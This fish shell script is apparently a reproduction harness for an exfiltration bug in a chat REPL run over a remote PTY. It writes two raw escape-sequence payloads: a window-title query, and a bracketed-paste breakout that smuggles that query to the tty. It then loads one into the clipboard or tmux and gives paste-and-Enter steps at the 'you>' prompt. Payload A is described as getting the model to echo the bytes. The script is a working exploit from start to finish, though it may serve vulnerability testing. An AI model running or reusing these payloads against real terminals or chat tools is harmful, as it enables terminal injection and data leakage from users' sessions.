#!/usr/bin/env fish
set OUT_A /tmp/exfil_payload_a.bin
set OUT_B /tmp/exfil_payload_b.bin

printf '\x1b[21t' >$OUT_A
printf '\x1b[201~\xf0\x1b[21t' >$OUT_B

echo "payload A (model-echo trigger, 2 turns) -> $OUT_A"
echo "    bytes: ESC [ 2 1 t            window-title query, committed verbatim into the message"
echo "payload B (handle_text smuggle, 1 turn) -> $OUT_B"
echo "    bytes: ESC[201~ <0xf0> ESC[21t  paste breakout, then smuggles the query to the tty"
echo

set COPIED 0
if type -q wl-copy
    wl-copy <$OUT_A
    set COPIED 1
    echo "payload A copied to clipboard (wl-copy)"
else if type -q xclip
    xclip -selection clipboard <$OUT_A
    set COPIED 1
    echo "payload A copied to clipboard (xclip)"
else if type -q pbcopy
    pbcopy <$OUT_A
    set COPIED 1
    echo "payload A copied to clipboard (pbcopy)"
end

if test $COPIED -eq 0
    echo "no clipboard tool found; copy $OUT_A by hand or use the tmux path below"
end

echo
echo "1) start the repl over the remote PTY:"
echo "     ./remote_perf.fish repro_exfil.mojo"
echo "2) at the you> prompt, paste (Ctrl+Shift+V) then Enter, then Enter again"
echo
echo "raw-byte payload B is best delivered with tmux (run the repl inside tmux):"
echo "     Ctrl-b :  load-buffer $OUT_B   <Enter>"
echo "     Ctrl-b :  paste-buffer -p      <Enter>"
